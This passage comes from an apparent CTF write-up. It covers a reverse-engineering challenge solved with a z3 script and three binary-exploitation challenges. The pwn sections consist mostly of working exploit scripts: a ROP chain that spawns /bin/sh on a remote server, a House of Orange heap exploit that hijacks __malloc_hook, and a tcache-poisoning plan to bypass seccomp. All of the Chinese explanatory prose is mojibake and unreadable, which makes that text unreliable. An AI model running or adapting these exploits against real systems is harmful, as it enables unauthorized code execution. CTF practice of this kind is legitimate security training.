[BitVec(<span class="string">f'v28_<span class="subst">{i}</span>'</span>, <span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(flag_len)]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(flag_len):</span><br><span class="line">    random_val = libc.rand() &amp; <span class="number">0xff</span></span><br><span class="line">    solver.add(v28[i] == flag_chars[i] ^ random_val)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 2: Shuffle array s</span></span><br><span class="line">ptr = [i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(flag_len)]</span><br><span class="line">k = flag_len - <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> k &gt;= <span class="number">0</span>:</span><br><span class="line">    v18 = (libc.rand() % (k + <span class="number">1</span>)) &amp; <span class="number">0xff</span></span><br><span class="line">    v19 = ptr[k]</span><br><span class="line">    ptr[k] = ptr[v18]</span><br><span class="line">    ptr[v18] = v19</span><br><span class="line">    k -= <span class="number">1</span></span><br><span class="line"></span><br><span class="line">val1 = [</span><br><span class="line"><span class="number">0xd8</span>, <span class="number">0xe0</span>, <span class="number">0x19</span>, <span class="number">0xe8</span>, <span class="number">0xcd</span>, <span class="number">0x9f</span>, <span class="number">0x6d</span>, <span class="number">0x65</span>,</span><br><span class="line"><span class="number">0xb8</span>, <span class="number">0x11</span>, <span class="number">0x81</span>, <span class="number">0xc8</span>, <span class="number">0x6e</span>, <span class="number">0xd0</span>, <span class="number">0xdb</span>, <span class="number">0xf8</span>,</span><br><span class="line"><span class="number">0x6b</span>, <span class="number">0xf9</span>, <span class="number">0x7d</span>, <span class="number">0xd2</span>, <span class="number">0xd6</span>, <span class="number">0xd5</span>, <span class="number">0x0f</span>, <span class="number">0x89</span>,</span><br><span class="line"><span class="number">0x1e</span>, <span class="number">0x34</span>, <span class="number">0x6a</span>, <span class="number">0xc5</span>, <span class="number">0xfd</span>, <span class="number">0xc1</span>, <span class="number">0xe9</span>, <span class="number">0x26</span>,</span><br><span class="line"><span class="number">0xd0</span>, <span class="number">0xba</span>, <span class="number">0xfa</span>, <span class="number">0x99</span>, <span class="number">0xe7</span>, <span class="number">0x06</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">val2 = [<span class="number">0x6</span>, <span class="number">0x4a</span>, <span class="number">0x5b</span>, <span class="number">0x14</span>, <span class="number">0xc4</span>, <span class="number">0x77</span>, <span class="number">0xdf</span>, <span class="number">0x63</span>, <span class="number">0xb5</span>, <span class="number">0x82</span>, <span class="number">0xe0</span>, <span class="number">0x3c</span>, <span class="number">0x4a</span>, <span class="number">0x99</span>, <span class="number">0xce</span>, <span class="number">0xf9</span>, <span class="number">0xbc</span>, <span class="number">0x52</span>, <span class="number">0x79</span>, <span class="number">0xca</span>, <span class="number">0x19</span>, <span class="number">0x3c</span>, <span class="number">0xda</span>, <span class="number">0x1f</span>, <span class="number">0x2d</span>, <span class="number">0xfe</span>, <span class="number">0x93</span>, <span class="number">0xef</span>, <span class="number">0xa3</span>, <span class="number">0x2b</span>, <span class="number">0xc4</span>, <span class="number">0x1a</span>, <span class="number">0x44</span>, <span class="number">0xd5</span>, <span class="number">0xc2</span>, <span class="number">0x4</span>, <span class="number">0xbf</span>, <span class="number">0xec</span>]</span><br><span class="line"></span><br><span class="line">random_vals = [<span class="number">0</span>] * flag_len</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(flag_len):</span><br><span class="line">    random_vals[i] = val1[i] ^ val2[i]</span><br><span class="line"></span><br><span class="line"><span class="comment"># *((_BYTE *)v31 + m) = *((_BYTE *)v28 + *((unsigned __int8 *)ptr + m));</span></span><br><span class="line">v31 = [BitVec(<span class="string">f'v31_<span class="subst">{i}</span>'</span>, <span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(flag_len)]</span><br><span class="line"><span class="keyword">for</span> m <span class="keyword">in</span> <span class="built_in">range</span>(flag_len):</span><br><span class="line">    solver.add(v31[m] == (v28[ptr[m]] ) ^ (random_vals[m]) &amp; <span class="number">0xff</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># s1[ii] = *((_BYTE *)v31 + ii) ^ v32[ii];</span></span><br><span class="line">v32 = [<span class="number">0xBF</span>, <span class="number">0xD7</span>, <span class="number">0x2E</span>, <span class="number">0xDA</span>, <span class="number">0xEE</span>, <span class="number">0xA8</span>, <span class="number">0x1A</span>, <span class="number">0x10</span>, <span class="number">0x83</span>, <span class="number">0x73</span>, <span class="number">0xAC</span>, <span class="number">0xF1</span>, <span class="number">0x06</span>, <span class="number">0xBE</span>, <span class="number">0xAD</span>, <span class="number">0x88</span>, <span class="number">0x04</span>, <span class="number">0xD7</span>, <span class="number">0x12</span>, <span class="number">0xFE</span>, <span class="number">0xB5</span>, <span class="number">0xE2</span>, <span class="number">0x61</span>, <span class="number">0xB7</span>, <span class="number">0x3D</span>, <span class="number">0x07</span>, <span class="number">0x4A</span>, <span class="number">0xE8</span>, <span class="number">0x96</span>, <span class="number">0xA2</span>, <span class="number">0x9D</span>, <span class="number">0x4D</span>, <span class="number">0xBC</span>, <span class="number">0x81</span>, <span class="number">0x8C</span>, <span class="number">0xE9</span>, <span class="number">0x88</span>, <span class="number">0x78</span>]</span><br><span class="line">s1 = [BitVec(<span class="string">f's1_<span class="subst">{i}</span>'</span>, <span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(flag_len)]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(flag_len):</span><br><span class="line">    solver.add(s1[i] == v31[i] ^ v32[i])</span><br><span class="line"></span><br><span class="line">s2 = <span class="string">"congratulationstoyoucongratulationstoy"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(flag_len):</span><br><span class="line">    solver.add(s1[i] == <span class="built_in">ord</span>(s2[i]))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> solver.check() == sat:</span><br><span class="line">    model = solver.model()</span><br><span class="line">    flag = <span class="string">''</span>.join([<span class="built_in">chr</span>(model[flag_chars[i]].as_long()) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(flag_len)])</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f'flag: <span class="subst">{flag}</span>'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">'unsat'</span>)</span><br></pre></td></tr></tbody></table></figure><p>å…¶ä¸­ç¬¬ä¸‰æ¬¡è·å–38ä¸ªéšæœºæ•°æ—¶ï¼Œæˆ‘ä½¿ç”¨ ctypes å¾—åˆ°çš„éšæœºæ•°ä¸å®é™…çš„éšæœºæ•°ä¸ç¬¦ï¼Œå› æ­¤ç›´æ¥åœ¨ gdb ä¸­æ‰“å° v31 è¿™ä¸ªæ•°ç»„åœ¨ä¸éšæœºæ•°å¼‚æˆ–å‰åçš„å€¼ï¼Œå¾—åˆ°ç¬¬ä¸‰è½®çš„38ä¸ªéšæœºæ•°ã€‚ä¸æ¸…æ¥šæ˜¯ä»€ä¹ˆå¯¼è‡´äº†è¿™ç§å·®å¼‚ï¼Œä½†æˆ–è®¸è¿™å°±æ˜¯é¢˜ç›®æç¤ºâ€œåŠ¨é™ç»“åˆâ€çš„åŸå› ï¼Ÿ<br>æœ€åå¾—åˆ°flagï¼š</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag{78bace5989660ee38f1fd980a4b4fbcd}</span><br></pre></td></tr></tbody></table></figure><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="gostack"><a href="#gostack" class="headerlink" title="gostack"></a>gostack</h3><p>ä¸€é“ç®€å•çš„æ ˆæº¢å‡º+ROPé¢˜ç›®ï¼Œä¸€å¼€å§‹è¢« golang å”¬ä½äº†ï¼Œé€†å‘äº†ä¸€ä¼šå„¿æ²¡æ‰¾åˆ°ç¼“å†²åŒºçš„å¤§å°ï¼Œç„¶åç›´æ¥åœ¨ gdb ä¸­çœ‹å°±æ¸…æ¥šå¤šäº†ã€‚<br>é¦–å…ˆchecksecï¼š</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></tbody></table></figure><p>æœ‰æ ˆæº¢å‡º + æ²¡æœ‰canary + æ²¡æœ‰PIE + gadgets = ç®€å• ROP<br>æ‰¾åˆ°è¦ç”¨çš„gadgetsï¼Œæ„é€  ROP chain ï¼›åœ¨ gdb ä¸­è®¡ç®—å‡ºç¼“å†²åŒºå¼€å¤´ä¸è¿”å›åœ°å€çš„è·ç¦»ä¸º0x1d0å­—èŠ‚ï¼ŒåŠ ä¸Šå¡«å……å°±å¾—åˆ° payloadã€‚exp å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.binary = binary = ELF(<span class="string">'./gostack'</span>)</span><br><span class="line"><span class="comment"># context.log_level = 'critical'</span></span><br><span class="line"></span><br><span class="line">syscall = <span class="number">0x0000000000404043</span></span><br><span class="line">pop_rax = <span class="number">0x000000000040f984</span></span><br><span class="line">pop_rsi = <span class="number">0x000000000042138a</span></span><br><span class="line">pop_rdx = <span class="number">0x00000000004944ec</span></span><br><span class="line">pop_rdi_r14_r13_r12_rbp_rbx = <span class="number">0x00000000004a18a5</span></span><br><span class="line">read_func = <span class="number">0x46178d</span></span><br><span class="line">bss = binary.bss()</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = binary.process()</span></span><br><span class="line">p = remote(<span class="string">'8.147.129.254'</span>, <span class="number">29507</span>)</span><br><span class="line"><span class="comment"># read(0, bss, 0x100)</span></span><br><span class="line">rop_chain = flat(pop_rdi_r14_r13_r12_rbp_rbx, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, pop_rsi, bss, pop_rdx, <span class="number">8</span>, read_func)</span><br><span class="line"><span class="comment"># execve(bss, 0, 0)</span></span><br><span class="line">rop_chain += flat(pop_rdi_r14_r13_r12_rbp_rbx, bss, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, pop_rsi, <span class="number">0</span>, pop_rdx, <span class="number">0</span>, pop_rax, <span class="number">59</span>, syscall)</span><br><span class="line">payload = <span class="string">b'\x00'</span> * <span class="number">0x1d0</span> + rop_chain</span><br><span class="line">payload = payload.ljust(<span class="number">0x1000</span>, <span class="string">b'\x00'</span>)</span><br><span class="line">p.recvuntil(<span class="string">b'message :'</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p, '''b *0x4a0a9e''')</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">b'message :'</span>)</span><br><span class="line">p.sendline(<span class="string">b'/bin/sh\x00'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></tbody></table></figure><p>æœ‰ <code>syscall</code> ä½†æ˜¯æ²¡æœ‰ <code>syscall ; ret</code> ï¼Œå› æ­¤æˆ‘ä»¬çš„ ROP chain æœ€å¤šåªèƒ½æœ‰ä¸€æ¬¡ raw syscall ï¼Œå› æ­¤ read é€‰æ‹©ä½¿ç”¨å‡½æ•°åœ°å€è€Œä¸æ˜¯ raw syscallã€‚get shell ä¹‹åå¾—åˆ° flag ï¼š</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag{08c559f9-81f7-4c74-a983-9eb59502de34}</span><br></pre></td></tr></tbody></table></figure><h3 id="orange-cat-diary"><a href="#orange-cat-diary" class="headerlink" title="orange_cat_diary"></a>orange_cat_diary</h3><p>é¦–å…ˆç”¨ IDA åç¼–è¯‘ç¨‹åºï¼Œåœ¨ç¨‹åºä¸­å‘ç°ä»¥ä¸‹æ¼æ´ï¼š</p><ol><li>heap overflowï¼ˆ8å­—èŠ‚çš„æº¢å‡ºï¼‰</li><li>UAFï¼ˆåªèƒ½ä½¿ç”¨ä¸€æ¬¡ï¼Œå› ä¸ºåªèƒ½ delete ä¸€æ¬¡ï¼‰<ul><li>write after free</li><li>read after free</li></ul></li></ol><p>å†æ ¹æ®é¢˜ç›®åç§°çš„æç¤ºå¯ä»¥çŸ¥é“ï¼Œå¯ä»¥ä½¿ç”¨ <a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.23/house_of_orange.c">House of Orange</a> è¿›è¡Œæ”»å‡»ï¼ˆåˆ©ç”¨ heap overflow å’Œ read after freeï¼‰ï¼Œæ³„éœ²å‡º libc åœ°å€å’Œå †åœ°å€ã€‚ç”±äº libc çš„ç‰ˆæœ¬ä¸º2.23ï¼Œå› æ­¤æœ€ç®€ä¾¿çš„æ–¹æ³•å°±æ˜¯åŠ«æŒ <code>__malloc_hook</code> ã€‚ä½¿ç”¨ pwndbg çš„ <code>find_fake_fast</code> å‘½ä»¤æ‰¾åˆ°ç”¨äºè¦†ç›– <code>__malloc_hook</code> å†…å®¹çš„ fast bin åœ°å€ï¼Œç„¶ååˆ©ç”¨ write after free åŠ«æŒ fast bin ï¼Œä½¿å…¶è¿”å›è¯¥ chunk ï¼Œç„¶åå°†<code>__realloc_hook</code>å†™ä¸º<code>one_gadget</code>ï¼Œå°†<code>__malloc_hook</code>å†™ä¸º<code>realloc</code>ï¼Œè¿™æ ·åšæ›´å®¹æ˜“æ»¡è¶³<code>one_gadget</code>æ¡ä»¶ã€‚<br>åˆ©ç”¨ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># all protections are enabled</span></span><br><span class="line"><span class="comment"># heap overflow</span></span><br><span class="line"><span class="comment"># we can only use show and delete once</span></span><br><span class="line"></span><br><span class="line">context.binary = binary = ELF(<span class="string">'./orange_cat_diary'</span>)</span><br><span class="line">libc = binary.libc</span><br><span class="line"><span class="comment"># context.log_level = 'critical'</span></span><br><span class="line"></span><br><span class="line">libc_offset = <span class="number">0x3c5158</span></span><br><span class="line">malloc_hook_offset = <span class="number">0x3c4b10</span></span><br><span class="line">one_gadget_offset = <span class="number">0xf1247</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = binary.process()</span></span><br><span class="line">p = remote(<span class="string">'8.147.129.254'</span>, <span class="number">25553</span>)</span><br><span class="line">p.recvuntil(<span class="string">b'Please tell me your name.\n'</span>)</span><br><span class="line">p.sendline(<span class="string">b'BeaCox'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>():</span><br><span class="line">    p.recvuntil(<span class="string">b'###orange_cat_diary###'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b'Please input your choice:'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, content</span>):</span><br><span class="line">    menu()</span><br><span class="line">    p.sendline(<span class="string">b'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b'Please input the length of the diary content:'</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b'Please enter the diary content:\n'</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    menu()</span><br><span class="line">    p.sendline(<span class="string">b'2'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>():</span><br><span class="line">    menu()</span><br><span class="line">    p.sendline(<span class="string">b'3'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">size, content</span>):</span><br><span class="line">    menu()</span><br><span class="line">    p.sendline(<span class="string">b'4'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b'Please input the length of the diary content:'</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b'Please enter the diary content:\n'</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="comment"># House of Orange</span></span><br><span class="line">add(<span class="number">0x400</span>-<span class="number">8</span>, <span class="string">b'A'</span>*(<span class="number">0x400</span>-<span class="number">16</span>) + p64(<span class="number">0x0</span>))</span><br><span class="line">payload = <span class="string">b'A'</span>*(<span class="number">0x400</span>-<span class="number">16</span>) + p64(<span class="number">0x0</span>) + p64(<span class="number">0xc01</span>)</span><br><span class="line">edit(<span class="number">0x400</span>, payload)</span><br><span class="line">add(<span class="number">0x1000</span>, <span class="string">b'\n'</span>)</span><br><span class="line">add(<span class="number">0x68</span>, <span class="string">b'\n'</span>)</span><br><span class="line">show()</span><br><span class="line">p.recv(<span class="number">8</span>)</span><br><span class="line">libc_leak = u64(p.recv(<span class="number">8</span>))</span><br><span class="line">info(<span class="string">f'libc_leak: <span class="subst">{<span class="built_in">hex</span>(libc_leak)}</span>'</span>)</span><br><span class="line">libc.address = libc_leak - libc_offset</span><br><span class="line">info(<span class="string">f'libc_base: <span class="subst">{<span class="built_in">hex</span>(libc.address)}</span>'</span>)</span><br><span class="line">malloc_hook_addr = libc.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">info(<span class="string">f'malloc_hook_addr: <span class="subst">{<span class="built_in">hex</span>(malloc_hook_addr)}</span>'</span>)</span><br><span class="line">fake_bin_addr = malloc_hook_addr - <span class="number">0x23</span></span><br><span class="line">heap_leak = u64(p.recv(<span class="number">8</span>))</span><br><span class="line">info(<span class="string">f'heap_leak: <span class="subst">{<span class="built_in">hex</span>(heap_leak)}</span>'</span>)</span><br><span class="line">one_gadget = libc.address + one_gadget_offset</span><br><span class="line">info(<span class="string">f'one_gadget: <span class="subst">{<span class="built_in">hex</span>(one_gadget)}</span>'</span>)</span><br><span class="line">realloc = libc.sym[<span class="string">'realloc'</span>]</span><br><span class="line">info(<span class="string">f'realloc: <span class="subst">{<span class="built_in">hex</span>(realloc)}</span>'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># overwrite __malloc_hook and __realloc_hook</span></span><br><span class="line">delete()</span><br><span class="line">edit(<span class="number">0x68</span>, p64(fake_bin_addr) + p64(fake_bin_addr) + <span class="string">b'\n'</span>)</span><br><span class="line">add(<span class="number">0x68</span>, cyclic(<span class="number">0x68</span>))</span><br><span class="line">payload = <span class="string">b'a'</span>*<span class="number">0xb</span> + p64(one_gadget) + p64(realloc)</span><br><span class="line">add(<span class="number">0x68</span>, payload + <span class="string">b'\n'</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p, '')</span></span><br><span class="line">p.send(<span class="string">b'1'</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></tbody></table></figure><p>get shell å¹¶å¾—åˆ° flag ï¼š</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag{2a6de11d-8a93-484d-9444-7d1046c55134}</span><br></pre></td></tr></tbody></table></figure><h3 id="EzHeap"><a href="#EzHeap" class="headerlink" title="EzHeap"></a>EzHeap</h3><p>æˆ‘åˆšå¼€å§‹æ”¾ payload çš„å †é€‰äº†0x80å¤§å°ï¼Œæ ¹æœ¬æ”¾ä¸ä¸‹ ROP chain ï¼Œç›´æ¥å¯¼è‡´æ¯”èµ›ç»“æŸæ—¶æ²¡æ¥å¾—åŠå°†è¿™é¢˜åšå®Œï¼Œèµ›ååæ¥åˆ†é’Ÿæ”¹äº†ä¸ªå¤§å°å°±æ‰“é€šäº†ã€‚</p><p>åˆä¸€é“å †é¢˜ï¼Œä½†æ˜¯ä½¿ç”¨ seccomp é™åˆ¶äº†ç³»ç»Ÿè°ƒç”¨ï¼š</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$ seccomp-tools dump ./EzHeap</span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = <span class="built_in">arch</span></span><br><span class="line"> 0001: 0x15 0x00 0x09 0xc000003e  <span class="keyword">if</span> (A != ARCH_X86_64) goto 0011</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x35 0x00 0x01 0x40000000  <span class="keyword">if</span> (A &lt; 0x40000000) goto 0005</span><br><span class="line"> 0004: 0x15 0x00 0x06 0xffffffff  <span class="keyword">if</span> (A != 0xffffffff) goto 0011</span><br><span class="line"> 0005: 0x15 0x04 0x00 0x00000000  <span class="keyword">if</span> (A == <span class="built_in">read</span>) goto 0010</span><br><span class="line"> 0006: 0x15 0x03 0x00 0x00000001  <span class="keyword">if</span> (A == write) goto 0010</span><br><span class="line"> 0007: 0x15 0x02 0x00 0x00000002  <span class="keyword">if</span> (A == open) goto 0010</span><br><span class="line"> 0008: 0x15 0x01 0x00 0x0000000a  <span class="keyword">if</span> (A == mprotect) goto 0010</span><br><span class="line"> 0009: 0x15 0x00 0x01 0x0000003c  <span class="keyword">if</span> (A != <span class="built_in">exit</span>) goto 0011</span><br><span class="line"> 0010: 0x06 0x00 0x00 0x7fff0000  <span class="built_in">return</span> ALLOW</span><br><span class="line"> 0011: 0x06 0x00 0x00 0x00000000  <span class="built_in">return</span> KILL</span><br></pre></td></tr></tbody></table></figure><p>å› æ­¤å¾ˆå®¹æ˜“æƒ³åˆ°å…ˆç”¨ <code>mprotect</code> æ›´æ”¹é¡µé¢æƒé™ï¼Œç„¶å orw ç›´æ¥è¯» flagã€‚ä½†æ˜¯æˆ‘æœ€åæ²¡æœ‰ä½¿ç”¨ <code>mprotect</code> ï¼Œç›´æ¥åœ¨æ ˆä¸Šæ„é€  ROP chain æ¥è¿›è¡Œ orw ã€‚</p><p>åˆ†æç¨‹åºï¼Œå‘ç°æ¼æ´ï¼š</p><ol><li>æå¤§ heap overflow </li><li>è¾“å…¥æ—  0 æˆªæ–­å¯å¯¼è‡´ç›¸é‚»å†…å­˜æ³„æ¼</li></ol><p>è€Œä¸”æœ€å¤šå…è®¸æˆ‘ä»¬ <code>malloc</code> 80ä¸ªå †å—ï¼Œå› æ­¤åº”è¯¥æœ‰ä¸å°‘åˆ©ç”¨æ–¹æ³•ã€‚æˆ‘ä¸»è¦åˆ©ç”¨ <a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.35/tcache_poisoning.c">tcache poisoning</a> ã€‚æ”»å‡»æ€è·¯å¦‚ä¸‹ï¼š</p><ul><li><p>é¦–å…ˆåˆ©ç”¨å †æº¢å‡ºå’Œç›¸é‚»å†…å­˜æ³„éœ²ï¼Œé€šè¿‡ç¨‹åºå†…å·²ç»æœ‰çš„ unsorted bins ç­‰å †å—ï¼Œæ³„éœ² libc å’Œ heap åœ°å€</p></li><li><p>è®¡ç®— libc ä¸­ <code>__environ</code> çš„åœ°å€ï¼Œåˆ©ç”¨ tcache poisoning è·å¾—è¯¥åœ°å€å¤„çš„å †å—è¿›è¡Œè¯»ï¼Œæ³„éœ² stack åœ°å€</p><p>libc ç‰ˆæœ¬ä¸º2.35ï¼Œå› æ­¤è¦æ‰‹åŠ¨ <a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.35/decrypt_safe_linking.c">safe link</a> </p></li><li><p>åœ¨æŸä¸ªå †å—ä¸­å†™å…¥ <code>flag\x00</code> ç”¨äº orw ï¼Œæœé›† gadgets æ„é€  ROP chain ã€‚å€¼å¾—æ³¨æ„çš„æ˜¯ä¸èƒ½ç›´æ¥è°ƒç”¨åº“å‡½æ•° orw ï¼Œå› ä¸ºåº“å‡½æ•°çš„<code>open</code> å¾€å¾€ä½¿ç”¨ <code>openat</code> ç³»ç»Ÿè°ƒç”¨ï¼Œä¼šè¢«ç¦æ­¢ã€‚å› æ­¤æˆ‘ç›´æ¥é€‰æ‹©å…¨éƒ¨ä½¿ç”¨ <code>syscall ; ret</code>  gadget ï¼Œè¿™ä¹Ÿæ˜¯å¯¼è‡´æˆ‘ payload å·¨å¤§çš„åŸå› ã€‚</p></li><li><p>åœ¨ <code>malloc_heap</code> æ“ä½œå¯¹åº”å‡½æ•°çš„ <code>ret</code> å¤„ä¸‹æ–­ç‚¹ï¼Œè®¡ç®—æ­¤æ—¶ stack åœ°å€ä¸æ³„éœ² stack åœ°å€çš„åç§»ï¼Œç„¶åå†åˆ©ç”¨ tcache poisoning è·å¾—ç›®æ ‡åœ°å€é™„è¿‘ï¼ˆ<code>target_stack-0x8</code>ï¼Œå› ä¸ºè¦16å­—èŠ‚å¯¹é½ä¸”ä¸èƒ½ç ´åcanaryï¼‰çš„å †å—è¿›è¡Œå†™ã€‚payload ä¸º 8 å­—èŠ‚çš„ rbp å¡«å……åŠ ä¸Š ROP chain ã€‚<code>malloc_heap</code> è¿”å›æ—¶ä¼šè¢«åŠ«æŒåˆ°è¯¥ ROP chain ã€‚</p></li></ul><p>exp å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span 